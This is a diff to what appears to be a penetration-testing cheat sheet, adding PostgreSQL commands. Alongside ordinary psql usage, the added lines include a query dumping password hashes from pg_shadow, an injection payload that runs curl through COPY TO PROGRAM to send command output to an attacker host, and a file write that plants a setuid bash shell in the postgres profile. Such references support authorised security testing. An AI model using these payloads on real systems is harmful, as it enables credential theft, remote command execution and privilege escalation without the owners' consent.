@@ -380,6 +380,7 @@ while not done:
 
 ```c
 $ psql
+$ psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
 $ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 $ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 ```
@@ -387,14 +388,32 @@ $ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
 ### Common Commands
 
 ```c
-postgres=# \c
-postgres=# \list
-postgres=# \c  <DATABASE>
-<DATABASE>=# \dt
-<DATABASE>=# \du
-<DATABASE>=# TABLE <TABLE>;
-<DATABASE>=# SELECT * FROM users;
-<DATABASE>=# \q
+postgres=# \list                     // list all databases
+postgres=# \c                        // use database
+postgres=# \c <DATABASE>             // use specific database
+postgres=# \s                        // command history
+postgres=# \q                        // quit
+<DATABASE>=# \dt                     // list tables from current schema
+<DATABASE>=# \dt *.*                 // list tables from all schema
+<DATABASE>=# \du                     // list users roles
+<DATABASE>=# \du+                    // list users roles
+<DATABASE>=# SELECT user;            // get current user
+<DATABASE>=# TABLE <TABLE>;          // select table
+<DATABASE>=# SELECT * FROM users;    // select everything from users table
+<DATABASE>=# SHOW rds.extensions;    // list installed extensions
+<DATABASE>=# SELECT usename, passwd from pg_shadow;    // read credentials
+```
+
+### Command Execution
+
+```c
+<DATABASE>=# x'; COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>?f=`whoami|base64`'-- x
+```
+
+#### File Write
+
+```c
+<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
 ```
 
 ## Redis
